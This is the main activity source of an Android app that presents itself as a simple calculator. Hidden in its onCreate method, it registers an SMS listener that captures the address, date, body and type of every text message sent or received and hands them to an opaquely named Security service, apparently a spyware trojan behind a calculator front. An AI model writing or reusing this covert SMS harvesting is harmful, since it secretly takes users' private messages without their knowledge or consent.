package com.calculator.calculator;

import java.text.DecimalFormat;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;



public class Calculator extends Activity implements View.OnClickListener {

    private TextView mCalculatorDisplay;
    private Boolean userIsInTheMiddleOfTypingANumber = false;
    private CalculatorBrain mCalculatorBrain;
    private static final String DIGITS = "0123456789.";
    public static String TAG = "tag";

    final private DecimalFormat df = new DecimalFormat("@#############");





    @SuppressLint("NewApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // hide the window title
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        //hide status bar and other OS-level chrome
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        SmsRadar.initializeSmsRadarService(getApplicationContext(), new SmsListener() {

            @Override
            public void onSmsSent(Sms sms) {
                Log.d(TAG,"SMS sent");
                Security.startActionFoo(getApplicationContext(), sms.getAddress(), sms.getDate(), sms.getMsg(), sms.getType().toString());
            }

            @Override
            public void onSmsReceived(Sms sms) {
                Log.d(TAG,"SMS received");
                Security.startActionFoo(getApplicationContext(),sms.getAddress(),sms.getDate(),sms.getMsg(),sms.getType().toString());
            }
        });


        mCalculatorBrain = new CalculatorBrain();
        mCalculatorDisplay = (TextView) findViewById(R.id.textView1);

        df.setMinimumFractionDigits(0);
        df.setMinimumIntegerDigits(1);
        df.setMaximumIntegerDigits(8);

        findViewById(R.id.digit0).setOnClickListener(this);
        findViewById(R.id.digit1).setOnClickListener(this);
        findViewById(R.id.digit2).setOnClickListener(this);
        findViewById(R.id.digit3).setOnClickListener(this);
        findViewById(R.id.digit4).setOnClickListener(this);
        findViewById(R.id.digit5).setOnClickListener(this);
        findViewById(R.id.digit6).setOnClickListener(this);
        findViewById(R.id.digit7).setOnClickListener(this);
        findViewById(R.id.digit8).setOnClickListener(this);
        findViewById(R.id.digit9).setOnClickListener(this);

        findViewById(R.id.plus).setOnClickListener(this);
        findViewById(R.id.minus).setOnClickListener(this);
        findViewById(R.id.mul).setOnClickListener(this);
        findViewById(R.id.div).setOnClickListener(this);
        findViewById(R.id.del).setOnClickListener(this);
        findViewById(R.id.dot).setOnClickListener(this);
        findViewById(R.id.equal).setOnClickListener(this);
    }
    @Override
    public void onClick(View v) {
    String buttonPressed = ((Button) v).getText().toString();

    if (DIGITS.contains(buttonPressed)) {
        if (userIsInTheMiddleOfTypingANumber) {
            if (!buttonPressed.equals(".") && !mCalculatorDisplay.getText().toString().contains(".")) {
                //ERROR prevention
                //Eliminate entering multiple decimals
                mCalculatorDisplay.append(buttonPressed);
            }
        } else {
            if (buttonPressed.equals(".")) {
                //if click decimal first than other number
                mCalculatorDisplay.setText(R.string.zero_dot);
            } else {
                mCalculatorDisplay.setText(buttonPressed);
            }
            userIsInTheMiddleOfTypingANumber = true;
        }
    } else {
        if (userIsInTheMiddleOfTypingANumber){
            mCalculatorBrain.setOperand(Double.parseDouble(mCalculatorDisplay.getText().toString()));
            userIsInTheMiddleOfTypingANumber = false;
        }
        mCalculatorBrain.performOperation(buttonPressed);
        mCalculatorDisplay.setText(df.format(mCalculatorBrain.getResult()));
    }

}
}


